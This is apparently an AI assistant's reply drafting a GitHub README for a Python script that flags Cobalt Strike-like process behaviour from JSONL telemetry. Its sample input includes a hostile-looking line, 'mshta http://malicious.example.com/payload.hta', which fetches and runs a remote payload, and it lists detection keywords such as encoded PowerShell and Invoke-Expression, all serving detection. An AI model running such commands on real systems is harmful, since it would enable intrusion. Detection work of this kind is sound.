Absolutely! Here's a professional **README-style explanation** you can use for your GitHub repo for the Cobalt Strike detection script:

---

# Cobalt Strike Detection Script

**Cobalt Strike Detection** is a Python-based script designed to detect potential Cobalt Strike activity in a controlled lab or test environment. It analyzes process telemetry and command-line data to flag suspicious behavior commonly associated with Cobalt Strike operations.

> ⚠️ **Safety Notice:** This script is intended for lab or simulated environments only. Do **not** use it on production systems or for offensive operations.

---

## Features

* Lightweight Python script with minimal dependencies (Python 3.8+).
* Detects suspicious process execution patterns (e.g., `powershell.exe`, `rundll32.exe`, `mshta.exe`).
* Flags suspicious command-line arguments (encoded commands, `Invoke-Expression`, Base64 downloads).
* Correlates events by process ID to prioritize high-confidence alerts.
* Configurable alert threshold to balance sensitivity and noise.

---

## Telemetry Streams

The script correlates events from **process execution telemetry**:

* **Process Execution**: Parent/child relationships, unusual processes spawned from Microsoft Office or other hosts.
* **Command-line / Script Execution**: Encoded commands, PowerShell `Invoke-Expression`, or Base64-encoded downloads.

> The script currently uses JSONL (JSON Lines) format for input, one JSON object per event.

---

## Example Input (JSONL)

```json
{"TimeCreated":"2025-09-20T12:00:00Z","ProcessId":1234,"ParentImage":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","Image":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","CommandLine":"powershell -enc ..."}
{"TimeCreated":"2025-09-20T12:01:00Z","ProcessId":1235,"ParentImage":"explorer.exe","Image":"mshta.exe","CommandLine":"mshta http://malicious.example.com/payload.hta"}
```

---

## Usage

```bash
python detect_cobaltstrike.py --events process_events.jsonl --threshold 4
```

* `--events`: Path to JSONL file containing process events.
* `--threshold`: Optional integer to adjust alert sensitivity (default: 4).

---

## Output

For each flagged process, the script prints:

```
PID:1234 Score:6 Reasons:child_susp_host,susp_cmdline
PID:1235 Score:5 Reasons:child_susp_host
```

* **Score**: Combined heuristic score for suspicious activity.
* **Reasons**: Indicators contributing to the score.

## Installation

1. Ensure Python 3.8+ is installed:

```bash
python --version
```

2. Clone the repository:

```bash
git clone https://github.com/YourUsername/cobaltstrike-detector.git
cd cobaltstrike-detector
```

3. Place JSONL telemetry files in the repo or provide a path.
